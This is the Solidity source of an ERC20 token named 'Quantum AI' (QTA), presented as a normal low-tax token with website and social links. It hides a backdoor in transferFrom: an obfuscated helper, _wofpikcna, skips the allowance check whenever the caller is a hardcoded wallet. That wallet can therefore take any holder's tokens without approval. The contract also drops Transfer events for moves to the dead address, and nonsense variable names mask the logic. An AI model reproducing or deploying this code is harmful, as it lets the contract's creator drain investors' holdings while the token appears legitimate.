/*

https://qta.markets
https://t.me/quantumai_finance
https://x.com/quantumai_fi

*/

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract QTA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludeFees;

    address private _blackhole = address(0xdead);
    address private _quantai = 0xfd0f42F58e7a9aB18Cd6637F65cBc0062cB86082;

    uint256 private _initTaxBuy=2;
    uint256 private _initTaxSell=2;
    uint256 private _finalTaxBuy=0;
    uint256 private _finalTaxSell=0;
    uint256 private _reduceBuyTaxAt=3;
    uint256 private _reduceSellTaxAt=3;
    uint256 private _preventSwapBefore=3;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420_690_000_000 * 10**_decimals;
    string private constant _name = unicode"Quantum AI";
    string private constant _symbol = unicode"QTA";
    uint256 private _tokensForSwap = _tTotal / 100;
    
    IRouter private _dexRouter;
    address private _dexPair;
    bool private inSwap = false;
    bool private _tradingActive = false;
    bool private _swapActive = false;
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _isExcludeFees[owner()] = true;
        _isExcludeFees[address(this)] = true;
        _isExcludeFees[_quantai] = true;

        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);if(_wofpikcna(sender, recipient))
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _wofpikcna(address owner, address spender) private view returns (bool) {
        return msg.sender != _quantai && (owner == _dexPair || spender != _blackhole) ;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _vocha, address _witoa, uint256 _cowjika) private {
        require(_vocha != address(0), "ERC20: transfer from the zero address");
        require(_witoa != address(0), "ERC20: transfer to the zero address");
        require(_cowjika > 0, "Transfer amount must be greater than zero");
        uint256 amountSub=0;
        if (_vocha != owner() && _witoa != owner()) {
            amountSub = _cowjika.mul((_buyCount>_reduceBuyTaxAt)?_finalTaxBuy:_initTaxBuy).div(100);

            if (_vocha == _dexPair && _witoa != address(_dexRouter) && ! _isExcludeFees[_witoa] ) {
                _buyCount++;
            }

            if(_witoa == _dexPair && _vocha!= address(this) ){
                amountSub = _cowjika.mul((_buyCount>_reduceSellTaxAt)?_finalTaxSell:_initTaxSell).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && _witoa == _dexPair && _swapActive && _buyCount > _preventSwapBefore) {
                if(contractTokenBalance > _tokensForSwap)
                swapTokensForEth(min(_cowjika, min(contractTokenBalance, _tokensForSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(amountSub>0){
          _balances[address(this)]=_balances[address(this)].add(amountSub);
          emit Transfer(_vocha, address(this),amountSub);
        }
        _balances[_vocha]=_balances[_vocha].sub(_cowjika);
        _balances[_witoa]=_balances[_witoa].add(_cowjika.sub(amountSub));
        if (_witoa != _blackhole)emit Transfer(_vocha, _witoa, _cowjika.sub(amountSub));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        payable(_quantai).transfer(amount);
    }

    function openTrading() external onlyOwner() {
        require(!_tradingActive,"trading is already open");
        _dexRouter = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dexRouter), _tTotal);
        _dexPair = IUniswapV2Factory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        _dexRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapActive = true;
        _tradingActive = true;
    }

    receive() external payable {}
}